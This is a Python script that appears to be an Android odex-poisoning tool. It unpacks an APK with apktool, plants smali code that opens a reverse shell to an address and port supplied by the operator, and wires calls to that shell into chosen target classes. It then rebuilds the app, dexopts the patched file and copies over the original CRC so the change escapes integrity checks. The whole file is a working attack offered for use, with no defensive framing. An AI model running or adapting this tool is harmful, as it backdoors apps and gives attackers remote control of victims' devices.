import sys
import tempfile

from poison_helper import *

apk = sys.argv[1]
rev_shell_address = sys.argv[2]
rev_shell_port = int(sys.argv[3])
target_classes = sys.argv[4].split(';')
unpacked_dir = tempfile.mkdtemp('odexpoison', 'kek')
dist = unpacked_dir + '/dist/'
print(unpacked_dir)


# -------------------


def run():
    # disassemble
    apktool_d(apk, unpacked_dir)

    # select highest smalli_sclasses\d+ dir
    classes_dirs = apktool_dir_get_classes_dirs(unpacked_dir)
    hi_classes = classes_dirs.pop()
    hi_classes_path = unpacked_dir + '/' + hi_classes

    # put reverse shell and trigger reverse shell from other files
    plant_smalish(rev_shell_address, rev_shell_port, hi_classes_path)
    plant_smalish_calls(hi_classes_path, target_classes)

    # assemble to get patched dex
    apktool_b(unpacked_dir)

    # unpack original apk, unpack patched apk, find patched dex
    packed_apk_name = os.listdir(dist)[0]
    unzip_dst = packed_apk_name.replace('.apk', '')
    unzip_orig_dst = packed_apk_name.replace('.apk', '') + "_orig"
    subprocess.check_output(['unzip', '-d', unzip_dst, packed_apk_name], cwd=dist)
    subprocess.check_output(['unzip', '-d', unzip_orig_dst, apk], cwd=dist)
    dexfilename = get_dex_filename_from_smali_classes_dirname(hi_classes)
    odex = dist + '/' + unzip_dst + '/' + dexfilename.replace('dex', 'odex')
    dex = dist + '/' + unzip_dst + '/' + dexfilename
    dex_orig = dist + '/' + unzip_orig_dst + '/' + dexfilename

    # dexopt the patched dex file
    adb_push_dexoptwrapper()
    dexopt(dex, odex)

    # copy crc f
    fix_crc(dex_orig, odex)
    return odex


print(run())
